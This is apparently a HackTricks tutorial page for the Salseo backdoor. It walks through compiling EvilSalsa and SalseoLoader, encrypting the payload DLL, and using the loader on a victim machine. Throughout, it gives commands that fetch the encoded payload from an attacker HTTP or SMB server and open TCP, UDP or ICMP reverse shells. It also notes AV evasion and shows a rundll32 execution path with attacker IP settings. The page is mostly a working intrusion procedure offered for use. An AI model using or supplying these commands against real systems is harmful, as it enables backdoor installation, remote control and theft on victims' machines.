# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compiling the binaries

Download the source code from the github and compile **EvilSalsa** and **SalseoLoader**. You will need **Visual Studio** installed to compile the code.

Compile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).

You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**

(\*\*If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Prepare the Backdoor

First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**:

### **Python**

```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```

### Windows

```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```

Ok, now you have everything you need to execute all the Salseo thing: the **encoded EvilDalsa.dll** and the **binary of SalseoLoader.**

**Upload the SalseoLoader.exe binary to the machine. They shouldn't be detected by any AV...**

## **Execute the backdoor**

### **Getting a TCP reverse shell (downloading encoded dll through HTTP)**

Remember to start a nc as the reverse shell listener and a HTTP server to serve the encoded evilsalsa.

```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```

### **Getting a UDP reverse shell (downloading encoded dll through SMB)**

Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).

```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```

### **Getting a ICMP reverse shell (encoded dll already inside the victim)**

**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Disable ICMP Replies:**

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

#### Execute the client:

```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```

#### Inside the victim, lets execute the salseo thing:

```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```

## Compiling SalseoLoader as DLL exporting main function

Open the SalseoLoader project using Visual Studio.

### Add before the main function: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Install DllExport for this project

#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Search for DllExport package (using Browse tab), and press Install (and accept the popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

In your project folder have appeared the files: **DllExport.bat** and **DllExport\_Configure.bat**

### **U**ninstall DllExport

Press **Uninstall** (yeah, its weird but trust me, it is necessary)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Exit Visual Studio and execute DllExport\_configure**

Just **exit** Visual Studio

Then, go to your **SalseoLoader folder** and **execute DllExport\_Configure.bat**

Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Open the project again with visual Studio**

**\[DllExport]** should not be longer marked as error

![](<../.gitbook/assets/image (8) (1).png>)

### Build the solution

Select **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)

![](<../.gitbook/assets/image (10) (1).png>)

Select **x64** **platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

To **build** the solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)

### Test the generated Dll

Copy and paste the Dll where you want to test it.

Execute:

```
rundll32.exe SalseoLoader.dll,main
```

If no error appears, probably you have a functional DLL!!

## Get a shell using the DLL

Don't forget to use a **HTTP** **server** and set a **nc** **listener**

### Powershell

```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```

### CMD

```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

